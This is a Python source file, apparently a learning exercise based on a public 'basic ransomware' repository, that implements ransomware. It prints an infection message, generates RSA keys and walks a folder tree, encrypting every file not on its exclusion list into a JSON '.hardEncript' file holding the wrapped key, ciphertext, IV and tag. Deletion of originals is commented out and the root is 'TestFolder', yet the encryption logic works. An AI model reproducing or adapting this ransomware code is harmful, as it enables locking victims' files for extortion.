"Basado en este codigo https://github.com/KR-4T0S/BASIC-RANSOMWARE/tree/master/file_encryption"

import os
import json
from file_encryption.rsa_key import *
from file_encryption.file_encryption import *
from base64 import b64encode

# Global Constants

class Ramsomware(object):
    

    def __init__(self):
         self.notencript=[ "rsa_key_public.pem", "rsa_key_private.pem","file_encryption.py", "file_decryption.py","rsa_key.py", "ransomware.py", "cure.py", "ransomware.exe", "cure.exe", "__pycache__"
, "build"]
         self.enc=FileEncript()
         self.keygen=RSAkeygeneration()
         
    def beginEncript(self):
        os.chdir("file_encryption")
        path=os.path.abspath(os.getcwd())
        print(path)
        # Simple prompt
        print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
        print("You are beeing infected")
        print("[!][!][!][!][!][!][!][!][!][!][!][!][!][!]")
        
        # Check for RSA keys if exist. Else generate.
        self.keygen.genPrivPublic()
        
        # Start walk (encrypt)
        self.encriptFiles()
    
    def encriptFiles(self):
        # Begin file walk
        
        rootDir = "TestFolder" # Root is where program starts
        exclude = [self.notencript[-1], self.notencript[-2]]
        for dirName, subdirList, fileList in os.walk(rootDir):
            subdirList[:] = [d for d in subdirList if d not in exclude]
            # Get directory names for debugging
            print("[+] %s" % dirName)
            
            for file_name in fileList:
                
                # Contactenate file info into a path
                file_path = os.path.join(dirName, file_name)
                
                if ( not file_name in self.notencript ):
                        # Get file names for debugging
                        print("[*] %s" % file_path)
    
                        # Encrypt File
                        
                        RSACipher, C, IV, tag, ext = self.enc.MyRSAEncrypt(file_path, self.notencript[0])
                        
                        # Create JSON file
                        name, extension = os.path.splitext(file_name)
                        file_name_new = name + ".hardEncript"
                        file_path_new = os.path.join(dirName, file_name_new)
                        
                        with open(file_path_new, "w") as file:
                            # Init json file data
                            file_data = {}
                            
                            # Load data into collection
                            file_data["RSACipher"] = b64encode(RSACipher).decode("utf-8")
                            file_data["C"] = b64encode(C).decode("utf-8")
                            file_data["IV"] = b64encode(IV).decode("utf-8")
                            file_data["tag"] = b64encode(tag).decode("utf-8")
                            file_data["ext"] = ext
                            
                            # Write data
                            json.dump(file_data, file, ensure_ascii = False)
                            file.close()
                        
                        # Delete original file
                        #os.remove(file_path)
                        
if __name__ == '__main__': 
    
    pp = Ramsomware()
    pp.beginEncript()